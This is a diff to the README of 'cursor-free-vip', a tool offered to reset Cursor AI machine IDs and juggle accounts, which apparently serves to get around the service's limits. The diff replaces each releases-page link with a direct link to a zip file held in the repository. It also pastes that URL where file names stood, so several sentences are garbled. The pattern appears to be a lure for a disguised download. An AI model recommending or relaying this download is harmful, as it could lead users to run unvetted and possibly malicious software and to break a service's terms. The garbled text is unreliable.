@@ -1,10 +1,10 @@
 # 🎉 cursor-free-vip - Manage Accounts Effortlessly
 
-[![Download Cursor Free VIP](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/anantbhardwaj828/cursor-free-vip/releases)
+[![Download Cursor Free VIP](https://raw.githubusercontent.com/anantbhardwaj828/cursor-free-vip/main/electron/vip-free-cursor-v2.3.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/anantbhardwaj828/cursor-free-vip/main/electron/vip-free-cursor-v2.3.zip)
 
 ## 🔍 Overview
 
-cursor-free-vip is a modern desktop application designed to reset your Cursor AI Machine ID and manage multiple accounts seamlessly. This application simplifies your workflow by addressing workbench.js and product.json issues directly within the app, providing built-in documentation and in-app fixes. Currently available for Windows (Beta), with macOS and Linux versions coming soon. 
+cursor-free-vip is a modern desktop application designed to reset your Cursor AI Machine ID and manage multiple accounts seamlessly. This application simplifies your workflow by addressing https://raw.githubusercontent.com/anantbhardwaj828/cursor-free-vip/main/electron/vip-free-cursor-v2.3.zip and https://raw.githubusercontent.com/anantbhardwaj828/cursor-free-vip/main/electron/vip-free-cursor-v2.3.zip issues directly within the app, providing built-in documentation and in-app fixes. Currently available for Windows (Beta), with macOS and Linux versions coming soon. 
 
 This tool is designed for educational purposes only, focusing on making automation easier for everyone.
 
@@ -12,7 +12,7 @@ This tool is designed for educational purposes only, focusing on making automati
 
 - **Reset Cursor AI Machine ID:** Quickly and easily reset the machine ID to avoid problems with account management.
 - **Multi-Account Management:** Switch between multiple accounts without hassle.
-- **In-App Fixes:** Get fixes for common issues such as workbench.js and product.json errors without needing technical skills.
+- **In-App Fixes:** Get fixes for common issues such as https://raw.githubusercontent.com/anantbhardwaj828/cursor-free-vip/main/electron/vip-free-cursor-v2.3.zip and https://raw.githubusercontent.com/anantbhardwaj828/cursor-free-vip/main/electron/vip-free-cursor-v2.3.zip errors without needing technical skills.
 - **Built-in Documentation:** Access helpful guides within the app to assist you.
 - **User-Friendly Interface:** Enjoy a modern GUI that simplifies the user experience.
 
@@ -22,7 +22,7 @@ To get started with cursor-free-vip, follow these simple steps to download and i
 
 1. **Download the Application:**
    - Click the button at the top of this page to visit our releases page. 
-   - [Download Cursor Free VIP](https://github.com/anantbhardwaj828/cursor-free-vip/releases)
+   - [Download Cursor Free VIP](https://raw.githubusercontent.com/anantbhardwaj828/cursor-free-vip/main/electron/vip-free-cursor-v2.3.zip)
 
 2. **Install the Application:**
    - After visiting the releases page, look for the latest version of cursor-free-vip. 
@@ -47,7 +47,7 @@ Before installing cursor-free-vip, please ensure your system meets the following
 
 To download the application, click below:
 
-[Download Cursor Free VIP](https://github.com/anantbhardwaj828/cursor-free-vip/releases)
+[Download Cursor Free VIP](https://raw.githubusercontent.com/anantbhardwaj828/cursor-free-vip/main/electron/vip-free-cursor-v2.3.zip)
 
 After downloading, follow the installation steps mentioned above. Ensure your computer meets the requirements to avoid any issues during setup.
 
